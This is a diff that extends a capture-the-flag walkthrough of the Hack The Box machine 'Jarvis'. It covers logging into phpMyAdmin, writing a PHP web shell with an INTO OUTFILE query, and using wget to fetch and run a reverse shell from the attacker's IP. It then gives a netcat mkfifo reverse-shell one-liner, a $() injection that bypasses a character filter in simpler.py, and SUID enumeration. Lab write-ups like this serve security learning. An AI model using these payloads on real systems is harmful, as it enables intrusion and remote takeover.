@@ -65,7 +65,7 @@ But this is a sha1 hash so after some hit and trial with the hash we got the val
 password:-imissyou
 ```
 
-## Getting Low priv shell
+## Getting Remote Code Execution
 
 we found ```phpmyadmin``` in dirb results
 ```
@@ -87,4 +87,96 @@ GENERATED WORDS: 4612
 ---- Scanning URL: http://10.10.10.143/ ----                                                                                           
 ==> DIRECTORY: http://10.10.10.143/phpmyadmin/
 ```
+After logging in with the credentials we got from sqlmap,We created a new database to upload shell ([Reference](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/))
+
+<<selection 011>>
+<br/>
+
+We used the following query to create a new PHP one liner shell
+
+```
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/hack.php"
+```
+<<selection 012>>
+<br/>
+
+We can execute commands now
+<<selection 013>>
+<br/>
+
+## Low Priv Shell
+
+We [downloaded](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) a PHP shell from here and started a listner
+
+Now we got a shell by executing this command on our rce php file...
+```
+http://10.10.10.143/hack.php?cmd=wget http://10.10.15.239:8081/sh.php;php sh.php
+```
+<<selection 014>>
+<br/>
+
+## Pivoting to pepper user
+
+we saw that we can execute this script ```simpler.py``` as user pepper 
+```
+$ python -c 'import pty;pty.spawn("/bin/bash")'                                                 
+www-data@jarvis:/$ sudo -l                                                                      
+sudo -l                                                                                         
+Matching Defaults entries for www-data on jarvis:                                               
+    env_reset, mail_badpass,                                                                    
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin               
+                                                                                                
+User www-data may run the following commands on jarvis:                                         
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py                                
+www-data@jarvis:/$    
+```
+
+After Going through the source code we found out that if we execute this script with ```-p``` paramter, it will ask for an ip address and there we can inject our code but it have a security check which blocks some characters...
+
+```
+forbidden = ['&', ';', '-', '`', '||', '|']
+```
+So after googling for a while we found out [this](https://vulners.com/zdt/1337DAY-ID-28868),So according to this we can execute commands inside `$(commands)` and it will bypass those checks...
+
+So we downloaded a ```shell.sh```  on the server which has netcat reverse shell in it ...
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.239 1233 >/tmp/f
+```
+
+and upon executing this command we get a reverse connection
+```
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+```
+then it asks for a IP address and we executed this command to get shell
+```
+$(sh /var/www/html/shell.sh)
+```
+<<workspace_15>>
+<br/>
+
+## Privesc
+
+Upon executing this ``` find / -perm -u=s -type f 2>/dev/null ``` command we found out that ```systemctl``` will run as root 
+
+```
+pepper@jarvis:/var/www$ find / -perm -u=s -type f 2>/dev/null 
+find / -perm -u=s -type f 2>/dev/null 
+/bin/mount
+/bin/ping
+/bin/systemctl
+/bin/umount
+/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+pepper@jarvis:/var/www$ 
+
+```
+
 
